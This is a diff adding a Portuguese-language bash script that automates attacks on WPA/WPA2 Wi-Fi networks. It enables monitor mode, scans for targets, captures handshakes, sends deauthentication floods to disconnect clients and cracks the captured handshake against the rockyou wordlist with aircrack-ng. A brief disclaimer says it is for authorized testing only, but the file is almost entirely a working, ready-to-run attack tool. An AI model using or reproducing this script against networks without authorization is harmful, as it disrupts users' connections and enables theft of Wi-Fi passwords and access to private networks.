@@ -1,0 +1,440 @@
+#!/bin/bash
+
+################################################################################
+#                                                                              #
+#  ██╗    ██╗██╗███████╗██╗     ██╗                                          #
+#  ██║    ██║██║██╔════╝██║     ██║                                          #
+#  ██║ █╗ ██║██║█████╗  ██║     ██║                                          #
+#  ██║██╗╚██║██║██╔══╝  ██║     ██║                                          #
+#  ╚███╔███╔╝██║██║     ███████╗███████╗                                     #
+#   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚══════╝                                     #
+#                                                                              #
+#  CAPTURA DE HANDSHAKE WIFI - WPA/WPA2                                      #
+#  Versão: 1.0                                                                 #
+#  Data: $(date +%d/%m/%Y)                                                     #
+#                                                                              #
+#  ⚠️  AVISO LEGAL: USE APENAS COM AUTORIZAÇÃO FORMAL POR ESCRITO!          #
+#  Este script é apenas para fins educacionais e testes autorizados.         #
+#                                                                              #
+################################################################################
+
+# Cores para output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+BOLD='\033[1m'
+
+# Configurações globais
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+OUTPUT_DIR="${SCRIPT_DIR}/capturas"
+WORDLIST_DIR="/usr/share/wordlists"
+DEFAULT_WORDLIST="${WORDLIST_DIR}/rockyou.txt"
+
+# Variáveis globais
+INTERFACE=""
+MONITOR_INTERFACE=""
+BSSID=""
+CHANNEL=""
+ESSID=""
+CAPTURE_FILE=""
+CLIENT_MAC=""
+
+################################################################################
+# FUNÇÕES AUXILIARES
+################################################################################
+
+# Banner
+show_banner() {
+    clear
+    echo -e "${CYAN}${BOLD}"
+    cat << "EOF"
+  ██╗    ██╗██╗███████╗██╗     ██╗
+  ██║    ██║██║██╔════╝██║     ██║
+  ██║ █╗ ██║██║█████╗  ██║     ██║
+  ██║██╗╚██║██║██╔══╝  ██║     ██║
+  ╚███╔███╔╝██║██║     ███████╗███████╗
+   ╚══╝╚══╝ ╚═╝╚═╝     ╚══════╝╚══════╝
+EOF
+    echo -e "${NC}"
+    echo -e "${YELLOW}Captura de Handshake WPA/WPA2${NC}"
+    echo -e "${RED}⚠️  USE APENAS COM AUTORIZAÇÃO!${NC}\n"
+}
+
+# Verificar se está rodando como root
+check_root() {
+    if [[ $EUID -ne 0 ]]; then
+        echo -e "${RED}[!] Este script precisa ser executado como root (sudo)${NC}"
+        exit 1
+    fi
+}
+
+# Verificar dependências
+check_dependencies() {
+    local missing=0
+    
+    echo -e "${BLUE}[*] Verificando dependências...${NC}"
+    
+    for tool in airmon-ng airodump-ng aireplay-ng aircrack-ng iwconfig; do
+        if ! command -v $tool &> /dev/null; then
+            echo -e "${RED}[!] $tool não encontrado${NC}"
+            missing=1
+        fi
+    done
+    
+    if [[ $missing -eq 1 ]]; then
+        echo -e "${YELLOW}[*] Instalando aircrack-ng...${NC}"
+        apt-get update && apt-get install -y aircrack-ng
+    else
+        echo -e "${GREEN}[+] Todas as dependências estão instaladas${NC}"
+    fi
+}
+
+# Detectar interface Wi-Fi
+detect_interface() {
+    echo -e "${BLUE}[*] Detectando interfaces Wi-Fi...${NC}"
+    
+    local interfaces=$(iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep -v '^$')
+    
+    if [[ -z "$interfaces" ]]; then
+        echo -e "${RED}[!] Nenhuma interface Wi-Fi encontrada${NC}"
+        exit 1
+    fi
+    
+    echo -e "${CYAN}Interfaces disponíveis:${NC}"
+    local count=1
+    local if_array=()
+    
+    for iface in $interfaces; do
+        if [[ "$iface" != "lo" ]]; then
+            echo -e "${GREEN}  [$count] $iface${NC}"
+            if_array+=("$iface")
+            ((count++))
+        fi
+    done
+    
+    if [[ ${#if_array[@]} -eq 1 ]]; then
+        INTERFACE=${if_array[0]}
+        echo -e "${GREEN}[+] Usando interface: $INTERFACE${NC}"
+    else
+        echo -ne "${YELLOW}[?] Escolha a interface (1-${#if_array[@]}): ${NC}"
+        read choice
+        if [[ $choice -ge 1 && $choice -le ${#if_array[@]} ]]; then
+            INTERFACE=${if_array[$((choice-1))]}
+            echo -e "${GREEN}[+] Interface selecionada: $INTERFACE${NC}"
+        else
+            echo -e "${RED}[!] Escolha inválida${NC}"
+            exit 1
+        fi
+    fi
+}
+
+# Colocar interface em modo monitor
+enable_monitor_mode() {
+    echo -e "${BLUE}[*] Colocando interface em modo monitor...${NC}"
+    
+    # Matar processos que podem interferir
+    echo -e "${YELLOW}[*] Matando processos que podem interferir...${NC}"
+    airmon-ng check kill &> /dev/null
+    
+    sleep 2
+    
+    # Iniciar modo monitor
+    echo -e "${YELLOW}[*] Iniciando modo monitor em $INTERFACE...${NC}"
+    airmon-ng start $INTERFACE &> /dev/null
+    
+    sleep 2
+    
+    # Detectar interface monitor
+    MONITOR_INTERFACE="${INTERFACE}mon"
+    
+    # Verificar se a interface monitor existe
+    if ! iwconfig $MONITOR_INTERFACE &> /dev/null; then
+        # Tentar outras variações comuns
+        for suffix in "mon" "mon0" "mon1"; do
+            if iwconfig ${INTERFACE}${suffix} &> /dev/null 2>&1; then
+                MONITOR_INTERFACE="${INTERFACE}${suffix}"
+                break
+            fi
+        done
+    fi
+    
+    if iwconfig $MONITOR_INTERFACE &> /dev/null; then
+        echo -e "${GREEN}[+] Modo monitor ativado: $MONITOR_INTERFACE${NC}"
+        iwconfig $MONITOR_INTERFACE | grep -i mode
+    else
+        echo -e "${RED}[!] Falha ao ativar modo monitor${NC}"
+        exit 1
+    fi
+}
+
+# Escanear redes Wi-Fi
+scan_networks() {
+    echo -e "${BLUE}[*] Escaneando redes Wi-Fi...${NC}"
+    echo -e "${YELLOW}[*] Pressione Ctrl+C quando encontrar a rede alvo${NC}\n"
+    
+    sleep 2
+    
+    # Criar diretório de capturas
+    mkdir -p "$OUTPUT_DIR"
+    
+    # Executar airodump-ng
+    airodump-ng $MONITOR_INTERFACE
+}
+
+# Capturar handshake específico
+capture_handshake() {
+    echo -e "\n${BLUE}[*] Configurando captura de handshake...${NC}"
+    
+    # Solicitar informações da rede
+    echo -ne "${YELLOW}[?] BSSID do AP (ex: 34:CE:00:7F:91:E0): ${NC}"
+    read BSSID
+    
+    echo -ne "${YELLOW}[?] Canal (CH): ${NC}"
+    read CHANNEL
+    
+    echo -ne "${YELLOW}[?] Nome da rede (ESSID) [opcional]: ${NC}"
+    read ESSID
+    
+    echo -ne "${YELLOW}[?] MAC do cliente específico [opcional, Enter para todos]: ${NC}"
+    read CLIENT_MAC
+    
+    # Nome do arquivo de captura
+    CAPTURE_FILE="${OUTPUT_DIR}/captura_${TIMESTAMP}"
+    
+    echo -e "\n${GREEN}[+] Iniciando captura...${NC}"
+    echo -e "${CYAN}Arquivo: ${CAPTURE_FILE}.cap${NC}"
+    echo -e "${YELLOW}[*] Aguardando handshake... (abra outro terminal para executar deauth)${NC}\n"
+    
+    # Construir comando airodump-ng
+    local cmd="airodump-ng -c $CHANNEL --bssid $BSSID -w $CAPTURE_FILE $MONITOR_INTERFACE"
+    
+    if [[ -n "$ESSID" ]]; then
+        cmd="$cmd --essid $ESSID"
+    fi
+    
+    # Executar em background para poder mostrar instruções
+    $cmd &
+    local airodump_pid=$!
+    
+    echo -e "${GREEN}[+] Airodump-ng rodando (PID: $airodump_pid)${NC}"
+    echo -e "${YELLOW}[*] Para forçar reconexão, execute em outro terminal:${NC}"
+    echo -e "${CYAN}sudo aireplay-ng --deauth 10 -a $BSSID"
+    if [[ -n "$CLIENT_MAC" ]]; then
+        echo -e "-c $CLIENT_MAC"
+    fi
+    echo -e "$MONITOR_INTERFACE${NC}\n"
+    
+    echo -e "${YELLOW}[*] Ou execute esta função novamente para fazer deauth automático${NC}"
+    echo -e "${YELLOW}[*] Pressione Enter quando capturar o handshake...${NC}"
+    read
+    
+    # Parar airodump-ng
+    kill $airodump_pid 2>/dev/null
+    wait $airodump_pid 2>/dev/null
+    
+    # Verificar se capturou handshake
+    check_handshake
+}
+
+# Verificar se handshake foi capturado
+check_handshake() {
+    echo -e "\n${BLUE}[*] Verificando se handshake foi capturado...${NC}"
+    
+    local cap_file="${CAPTURE_FILE}-01.cap"
+    
+    if [[ ! -f "$cap_file" ]]; then
+        echo -e "${RED}[!] Arquivo de captura não encontrado${NC}"
+        return 1
+    fi
+    
+    # Verificar com aircrack-ng
+    local result=$(aircrack-ng "$cap_file" 2>&1 | grep -i "handshake\|1 handshake")
+    
+    if [[ -n "$result" ]]; then
+        echo -e "${GREEN}[+] ✓ Handshake capturado com sucesso!${NC}"
+        echo -e "${GREEN}[+] Arquivo: $cap_file${NC}"
+        return 0
+    else
+        echo -e "${RED}[!] Handshake não encontrado no arquivo${NC}"
+        echo -e "${YELLOW}[*] Tente executar o ataque deauth novamente${NC}"
+        return 1
+    fi
+}
+
+# Executar ataque deauth
+execute_deauth() {
+    if [[ -z "$BSSID" ]]; then
+        echo -e "${RED}[!] Execute a captura primeiro${NC}"
+        return 1
+    fi
+    
+    echo -e "${BLUE}[*] Executando ataque deauth...${NC}"
+    
+    local deauth_count=10
+    echo -ne "${YELLOW}[?] Número de pacotes deauth [10]: ${NC}"
+    read input
+    if [[ -n "$input" ]]; then
+        deauth_count=$input
+    fi
+    
+    local cmd="aireplay-ng --deauth $deauth_count -a $BSSID"
+    
+    if [[ -n "$CLIENT_MAC" ]]; then
+        cmd="$cmd -c $CLIENT_MAC"
+        echo -e "${YELLOW}[*] Atacando cliente específico: $CLIENT_MAC${NC}"
+    else
+        echo -e "${YELLOW}[*] Atacando todos os clientes do AP${NC}"
+    fi
+    
+    cmd="$cmd $MONITOR_INTERFACE"
+    
+    echo -e "${GREEN}[+] Executando: $cmd${NC}\n"
+    
+    $cmd
+    
+    echo -e "\n${GREEN}[+] Ataque deauth concluído${NC}"
+    echo -e "${YELLOW}[*] Verifique se o handshake foi capturado${NC}"
+}
+
+# Quebrar handshake com wordlist
+crack_handshake() {
+    if [[ -z "$CAPTURE_FILE" ]]; then
+        echo -e "${RED}[!] Nenhum arquivo de captura definido${NC}"
+        return 1
+    fi
+    
+    local cap_file="${CAPTURE_FILE}-01.cap"
+    
+    if [[ ! -f "$cap_file" ]]; then
+        echo -e "${RED}[!] Arquivo de captura não encontrado: $cap_file${NC}"
+        return 1
+    fi
+    
+    echo -e "${BLUE}[*] Quebrando handshake com wordlist...${NC}"
+    
+    # Verificar wordlist
+    local wordlist="$DEFAULT_WORDLIST"
+    
+    if [[ ! -f "$wordlist" ]]; then
+        echo -e "${YELLOW}[*] Wordlist padrão não encontrada${NC}"
+        echo -ne "${YELLOW}[?] Caminho da wordlist: ${NC}"
+        read wordlist
+        
+        if [[ ! -f "$wordlist" ]]; then
+            echo -e "${RED}[!] Wordlist não encontrada${NC}"
+            return 1
+        fi
+    else
+        echo -ne "${YELLOW}[?] Usar wordlist padrão ($wordlist)? [S/n]: ${NC}"
+        read use_default
+        if [[ "$use_default" =~ ^[Nn] ]]; then
+            echo -ne "${YELLOW}[?] Caminho da wordlist: ${NC}"
+            read wordlist
+            if [[ ! -f "$wordlist" ]]; then
+                echo -e "${RED}[!] Wordlist não encontrada${NC}"
+                return 1
+            fi
+        fi
+    fi
+    
+    echo -e "${GREEN}[+] Usando wordlist: $wordlist${NC}"
+    echo -e "${YELLOW}[*] Isso pode levar muito tempo...${NC}\n"
+    
+    # Executar aircrack-ng
+    if [[ -n "$BSSID" ]]; then
+        aircrack-ng -w "$wordlist" -b "$BSSID" "$cap_file"
+    else
+        aircrack-ng -w "$wordlist" "$cap_file"
+    fi
+}
+
+# Restaurar interface ao modo normal
+restore_interface() {
+    echo -e "\n${BLUE}[*] Restaurando interface ao modo normal...${NC}"
+    
+    if [[ -n "$MONITOR_INTERFACE" ]]; then
+        airmon-ng stop $MONITOR_INTERFACE &> /dev/null
+        echo -e "${GREEN}[+] Interface restaurada${NC}"
+    fi
+    
+    # Reiniciar NetworkManager se disponível
+    if command -v systemctl &> /dev/null; then
+        systemctl start NetworkManager &> /dev/null 2>&1
+    fi
+}
+
+# Menu principal
+show_menu() {
+    echo -e "\n${CYAN}${BOLD}=== MENU PRINCIPAL ===${NC}\n"
+    echo -e "${GREEN}[1]${NC} Escanear redes Wi-Fi"
+    echo -e "${GREEN}[2]${NC} Capturar handshake (rede específica)"
+    echo -e "${GREEN}[3]${NC} Executar ataque deauth"
+    echo -e "${GREEN}[4]${NC} Verificar handshake capturado"
+    echo -e "${GREEN}[5]${NC} Quebrar handshake com wordlist"
+    echo -e "${GREEN}[6]${NC} Restaurar interface"
+    echo -e "${RED}[0]${NC} Sair"
+    echo -ne "\n${YELLOW}[?] Escolha uma opção: ${NC}"
+}
+
+################################################################################
+# FUNÇÃO PRINCIPAL
+################################################################################
+
+main() {
+    show_banner
+    check_root
+    check_dependencies
+    
+    # Trap para restaurar interface ao sair
+    trap restore_interface EXIT INT TERM
+    
+    detect_interface
+    enable_monitor_mode
+    
+    while true; do
+        show_menu
+        read choice
+        
+        case $choice in
+            1)
+                scan_networks
+                ;;
+            2)
+                capture_handshake
+                ;;
+            3)
+                execute_deauth
+                ;;
+            4)
+                check_handshake
+                ;;
+            5)
+                crack_handshake
+                ;;
+            6)
+                restore_interface
+                enable_monitor_mode
+                ;;
+            0)
+                echo -e "${GREEN}[+] Saindo...${NC}"
+                restore_interface
+                exit 0
+                ;;
+            *)
+                echo -e "${RED}[!] Opção inválida${NC}"
+                ;;
+        esac
+        
+        echo -e "\n${YELLOW}[*] Pressione Enter para continuar...${NC}"
+        read
+    done
+}
+
+# Executar script
+main
+
